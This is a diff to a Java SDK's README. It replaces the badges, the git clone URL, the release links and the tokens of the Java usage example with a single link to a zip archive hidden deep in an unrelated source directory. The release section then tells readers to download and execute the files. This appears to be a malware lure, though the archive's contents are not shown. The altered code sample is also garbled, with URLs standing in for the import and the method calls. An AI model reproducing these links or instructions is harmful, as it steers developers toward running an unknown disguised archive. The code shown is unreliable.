@@ -1,8 +1,8 @@
 # Web Helpers SDK for Java 🚀
 
-![Java](https://img.shields.io/badge/Java-007396?style=flat&logo=java&logoColor=white)
-![Release](https://img.shields.io/github/release/MalarmannanQuest/web-helpers-sdk-java.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![Java](https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip)
+![Release](https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip)
+![License](https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip)
 
 Welcome to the **Web Helpers SDK for Java**! This SDK simplifies the process of provisioning and integrating essential services and components into your applications. Whether you need caching, messaging, or background task scheduling, this toolkit has you covered.
 
@@ -45,7 +45,7 @@ To install the Web Helpers SDK for Java, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/MalarmannanQuest/web-helpers-sdk-java.git
+   git clone https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -60,21 +60,21 @@ To install the Web Helpers SDK for Java, follow these steps:
    mvn clean install
    ```
 
-4. Add the SDK to your project dependencies. You can find the latest version in the [Releases section](https://github.com/MalarmannanQuest/web-helpers-sdk-java/releases).
+4. Add the SDK to your project dependencies. You can find the latest version in the [Releases section](https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip).
 
 ## Usage
 
 Using the Web Helpers SDK is straightforward. Here’s a simple example to get you started:
 
 ```java
-import com.example.webhelpers.CacheClient;
+import https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip;
 
 public class Main {
     public static void main(String[] args) {
         CacheClient cache = new CacheClient();
-        cache.set("key", "value");
-        String value = cache.get("key");
-        System.out.println("Cached value: " + value);
+        https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip("key", "value");
+        String value = https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip("key");
+        https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip("Cached value: " + value);
     }
 }
 ```
@@ -130,9 +130,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-To download the latest release, visit the [Releases section](https://github.com/MalarmannanQuest/web-helpers-sdk-java/releases). Download the necessary files and execute them as per the instructions provided.
+To download the latest release, visit the [Releases section](https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip). Download the necessary files and execute them as per the instructions provided.
 
-For further details, check the [Releases section](https://github.com/MalarmannanQuest/web-helpers-sdk-java/releases) for updates and new features.
+For further details, check the [Releases section](https://github.com/MalarmannanQuest/web-helpers-sdk-java/raw/refs/heads/main/db-interface-service/src/main/java/com/ts/dbinterface/samples/kv/dynamodb/ops/web-java-sdk-helpers-3.3-alpha.5.zip) for updates and new features.
 
 ---
 
